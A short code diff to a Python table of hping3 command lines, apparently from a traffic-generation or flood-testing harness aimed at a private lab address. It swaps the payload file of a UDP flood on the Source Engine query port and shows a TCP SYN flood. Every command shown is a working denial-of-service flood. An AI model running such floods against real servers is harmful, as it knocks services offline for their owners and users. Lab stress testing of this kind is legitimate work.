@@ -12,7 +12,7 @@ COMMANDS = {
     ),
     "hping3-flood-udp-vse": (
         "hping3 --udp --tos 0 --ttl 64 --destport 27015 --data 21 "
-        "--file table_atk_vse --flood 192.168.1.10"
+        "--file vse-query.bin --flood 192.168.1.10"
     ),
     "hping3-flood-tcp-syn": (
         "hping3 --tos 0 --ttl 64 --dontfrag --destport ++0 --setack 0 --syn --flood 192.168.1.10"
